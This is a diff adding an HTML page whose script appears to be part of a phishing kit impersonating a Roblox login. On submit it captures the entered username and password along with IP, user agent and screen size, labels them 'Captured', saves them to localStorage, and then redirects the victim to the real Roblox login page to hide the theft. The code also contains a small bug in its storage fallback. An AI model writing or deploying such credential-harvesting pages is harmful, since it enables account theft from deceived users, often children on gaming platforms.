@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- [Previous HTML content remains exactly the same until the script section] -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const credentials = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>', // Will show raw PHP code but won't break
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`
+            };
+
+            // Client-side logging as fallback
+            console.log("Captured:", credentials);
+            
+            // Save to localStorage (temporary client-side storage)
+            let logs = JSON.parse(localStorage.getItem('loginLogs') || []);
+            logs.push(credentials);
+            localStorage.setItem('loginLogs', JSON.stringify(logs));
+            
+            window.location.href = 'https://www.roblox.com/login';
+        });
+    </script>
+</body>
+</html>
